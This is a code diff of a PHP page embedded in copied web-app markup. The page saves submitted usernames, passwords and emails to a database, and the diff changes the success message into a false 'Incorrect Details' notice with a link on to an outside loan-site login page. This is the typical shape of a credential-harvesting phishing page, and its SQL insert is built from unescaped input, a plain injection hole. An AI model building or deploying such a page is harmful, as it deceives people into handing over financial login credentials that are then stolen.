@@ -2313,6 +2313,7 @@
         <style></style>
     </head>
     <body>
+        
     	<?php
 require('db.php');
 // If form submitted, insert values into the database.
@@ -2332,12 +2333,12 @@ VALUES ('$username', '$password', '$email', '$trn_date')";
         $result = mysqli_query($con,$query);
         if($result){
             echo "<div class='form'> <h3>You are registered successfully.</h3>
-<br/>Click here to <a href='login.php'>Login</a></div>";
+<br/>Incorrect Details <a href='https://myloan.svcfin.com/Login'>Continue</a></div>";
         }
     }else{
 ?>
 
-        <noscript>You need to enable JavaScript to run this app.</noscript>
+       
         <div id="root">
             <header
                 class="MuiPaper-root MuiAppBar-root MuiAppBar-positionFixed MuiAppBar-colorPrimary jss16 mui-fixed MuiPaper-elevation4"
@@ -2800,6 +2801,8 @@ VALUES ('$username', '$password', '$email', '$trn_date')";
         </script>
         <script src="/static/js/7.261340c6.chunk.js"></script>
         <script src="/static/js/main.a1040e13.chunk.js"></script>
+        
         <?php } ?>
+        
     </body>
 </html>
